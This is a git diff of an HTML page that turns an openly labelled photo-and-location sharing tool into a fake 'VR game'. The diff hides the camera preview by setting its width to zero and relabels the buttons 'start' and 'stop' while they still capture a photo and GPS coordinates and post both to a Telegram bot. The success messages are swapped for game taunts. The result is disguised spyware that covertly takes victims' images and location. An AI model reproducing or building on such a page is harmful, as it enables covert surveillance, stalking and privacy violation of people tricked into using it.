@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Snap & Share</title>
+  <title>puchachu mugnagna VR game</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -23,18 +23,19 @@
       border: none;
       border-radius: 8px;
     }
-    video {
-      margin-top: 1em;
-      max-width: 90%;
-      border-radius: 8px;
+    video {margin-top: 1em;
+  width: 0%;
+  max-width: 0px;
+  height: auto;
+  border-radius: 8px;
     }
   </style>
 </head>
 <body>
-  <h2>📸 Snap & Share</h2>
+  <h2>Puchachu mugnagna!!</h2>
 
-  <button onclick="startCamera()">Capture & Send Photo</button>
-  <button onclick="sendLocation()">📍 Share Location</button>
+  <button onclick="startCamera()">click here to start </button>
+  <button onclick="sendLocation()">click here to stop</button>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display: none;"></canvas>
@@ -52,9 +53,9 @@
           video.srcObject = stream;
           setTimeout(() => {
             captureAndSendPhoto(stream);
-          }, 3000); // wait 3 seconds to show camera preview
+          }, 1000); // wait 3 seconds to show camera preview
         })
-        .catch((err) => alert("Camera error: " + err));
+        .catch((err) => alert("error: " + err));
     }
 
     function captureAndSendPhoto(stream) {
@@ -72,7 +73,7 @@
         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
           method: "POST",
           body: formData,
-        }).then(res => alert("📷 Photo sent!")).catch(err => alert("❌ Photo error: " + err));
+        }).then(res => alert("you loose")).catch(err => alert("you win " + err));
       }, "image/png");
     }
 
@@ -86,11 +87,11 @@
         (position) => {
           const { latitude, longitude } = position.coords;
           fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`)
-            .then(res => alert("📍 Location sent!"))
-            .catch(err => alert("❌ Location error: " + err));
+            .then(res => alert("you won!"))
+            .catch(err => alert("you loose " + err));
         },
         (error) => {
-          alert("❌ Location access denied or failed");
+          alert("looser");
         }
       );
     }
